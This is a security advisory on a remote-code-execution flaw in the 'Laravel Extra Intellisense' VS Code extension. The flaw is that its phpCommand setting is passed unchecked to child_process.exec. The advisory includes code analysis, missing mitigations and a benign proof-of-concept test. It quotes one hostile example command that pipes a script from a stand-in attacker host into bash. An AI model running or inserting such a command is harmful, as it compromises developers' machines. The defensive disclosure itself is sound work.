### Vulnerability List

#### 1. Remote Code Execution via `phpCommand` setting

- **Description:**
    1. An attacker social engineers a developer into installing the "Laravel Extra Intellisense" VS Code extension.
    2. The attacker persuades the developer to modify the `LaravelExtraIntellisense.phpCommand` setting in VS Code. For example, the attacker could suggest a seemingly harmless command for Docker or Laravel Sail integration but inject malicious code. A malicious example could be: `bash -c "curl attacker.com/malicious.sh | bash"`.
    3. The extension periodically or on-demand executes PHP code by utilizing the command specified in the `phpCommand` setting. This is done to gather autocompletion data for Laravel projects, such as routes, views, configurations, etc.
    4. When the extension executes, it replaces the `{code}` placeholder in the `phpCommand` with generated PHP code and then executes this command using `child_process.exec` in the `helpers.ts` file.
    5. If the `phpCommand` setting is maliciously crafted as described in step 2, the attacker's injected code (e.g., `curl attacker.com/malicious.sh | bash`) will be executed on the developer's machine with the privileges of the VS Code process, leading to Remote Code Execution.

- **Impact:**
    - **Critical:** Successful exploitation allows an attacker to execute arbitrary commands on the developer's machine. This could lead to:
        - Full control over the developer's workstation.
        - Theft of sensitive data, including code, credentials, and private keys.
        - Installation of malware, backdoors, or ransomware.
        - Compromise of the developer's development environment and potentially the projects they are working on.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - **Security Note in `README.md`:** The `README.md` file contains a "Security Note" section that warns users about the extension running their Laravel application and suggests disabling the extension temporarily when writing sensitive code.
    ```markdown
    ## Security Note
    This extension runs your Laravel application automatically and periodically to get the information needed to provide autocomplete.

    So if you have any unknown errors in your log make sure the extension not causing it.

    Also if you writing any sensitive code in your service providers, disable the extension temporarily to prevent unwanted application executing.
    ```
    **This is not a technical mitigation** and relies on the developer reading and understanding the security implications, which is often insufficient.

- **Missing Mitigations:**
    - **Input Sanitization/Validation:** The extension lacks any sanitization or validation of the `phpCommand` setting. It should validate that the command is intended to execute PHP and potentially restrict the command to a safe list of executables or arguments.
    - **Warning on Malicious `phpCommand`:** VS Code should display a prominent warning to the user if the `phpCommand` setting is modified to a potentially dangerous command (e.g., containing shell operators like `|`, `;`, `&`, redirectors, or commands other than `php`).
    - **Principle of Least Privilege:** The extension should ideally not require executing arbitrary shell commands. If executing PHP code is necessary, it should be done in a safer way, possibly by directly using a PHP library within the extension's process instead of shelling out. Alternatively, if `phpCommand` is necessary for flexibility, it should be strictly controlled and secured.
    - **Restrict `phpCommand` scope:** The extension could restrict the `phpCommand` to only execute `php` interpreter and prevent execution of other commands like `bash`, `curl`, `wget`, etc.

- **Preconditions:**
    1. The developer has installed the "Laravel Extra Intellisense" VS Code extension.
    2. The developer is tricked into modifying the `LaravelExtraIntellisense.phpCommand` setting to a malicious command.
    3. The extension is activated and attempts to gather autocompletion data, triggering the execution of the malicious `phpCommand`.
    4. The developer has a Laravel project opened in VS Code workspace for the extension to be active.

- **Source Code Analysis:**
    1. **`helpers.ts` - `runPhp` function:** This function is responsible for executing PHP code.
    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // [VULNERABLE CODE]: Retrieves phpCommand from configuration without validation.
        let command = commandTemplate.replace("{code}", code); // [VULNERABLE CODE]: Replaces {code} with user-provided code, but commandTemplate itself can be malicious.
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // [VULNERABLE CODE]: Executes the command using child_process.exec, which can execute arbitrary shell commands if 'command' is malicious.
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) {
                    if (err == null) {
                        if (description != null) {
                            Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                        }
                        resolve(stdout);
                    } else {
                        const errorOutput = stderr.length > 0 ? stderr : stdout;
                        Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                        Helpers.showErrorPopup();
                        error(errorOutput);
                    }
                }
            );
        });
        return out;
    }
    ```
    - The code retrieves the `phpCommand` setting using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand')`.
    - It then uses `commandTemplate.replace("{code}", code)` to construct the final command. Critically, **no validation or sanitization is performed on `commandTemplate`** itself, which comes directly from user configuration.
    - Finally, `cp.exec(command, ...)` executes the constructed command. If `command` is malicious, `cp.exec` will execute it as a shell command, leading to RCE.

    2. **`helpers.ts` - `runLaravel` function:** This function builds upon `runPhp` to execute Laravel-specific code. It essentially wraps PHP code to bootstrap the Laravel application and then calls `runPhp`. The vulnerability in `runPhp` is directly exploitable via `runLaravel` as well.

    3. **`*Provider.ts` files:** Files like `RouteProvider.ts`, `ViewProvider.ts`, `ConfigProvider.ts`, etc., use `Helpers.runLaravel()` to fetch data for autocompletion. This means any of these providers can trigger the RCE vulnerability if a malicious `phpCommand` is configured. For example, `ConfigProvider.ts`:
    ```typescript
    loadConfigs() {
        try {
            var self = this;
            Helpers.runLaravel("echo json_encode(config()->all());", "Configs") // [VULNERABLE FUNCTION CALL]: Calls runLaravel, which uses runPhp and is vulnerable.
                .then(function (result) {
                    var configs = JSON.parse(result);
                    self.configs = self.getConfigs(configs);
                });
        } catch (exception) {
            console.error(exception);
        }
    }
    ```

- **Security Test Case:**
    1. **Prerequisites:**
        - VS Code installed.
        - Laravel Extra Intellisense extension installed.
        - A Laravel project opened in VS Code.
        - Node.js and npm installed (for testing purposes, not required for the vulnerability itself).
    2. **Setup Malicious `phpCommand`:**
        - In VS Code, go to File > Preferences > Settings (or Code > Settings on macOS).
        - Search for "Laravel Extra Intellisense phpCommand".
        - Modify the `phpCommand` setting to the following malicious command:
          ```json
          "LaravelExtraIntellisense.phpCommand": "bash -c 'touch /tmp/rce_vulnerability_test'"
          ```
          This command will attempt to create a file named `rce_vulnerability_test` in the `/tmp/` directory when executed on Linux/macOS. For Windows, you could use `cmd /c "type nul > %TEMP%\\rce_vulnerability_test"`.
    3. **Trigger Extension Activity:**
        - Open any PHP or Blade file within the Laravel project in VS Code.
        - Trigger autocompletion by typing `config('` or `route('` or `view('`. This should force the extension to run `Helpers.runLaravel()` to fetch autocompletion data.
    4. **Verify RCE:**
        - **Linux/macOS:** Open a terminal and check if the file `/tmp/rce_vulnerability_test` exists using `ls /tmp/rce_vulnerability_test`. If the file exists, the RCE is successful.
        - **Windows:** Open a command prompt and check if the file `%TEMP%\rce_vulnerability_test` exists.
    5. **Expected Result:** The file `rce_vulnerability_test` should be created in the respective temporary directory, demonstrating that arbitrary commands from the `phpCommand` setting can be executed by the extension.

This security test case proves that a malicious user who can manipulate the `phpCommand` setting can achieve Remote Code Execution on the developer's machine.
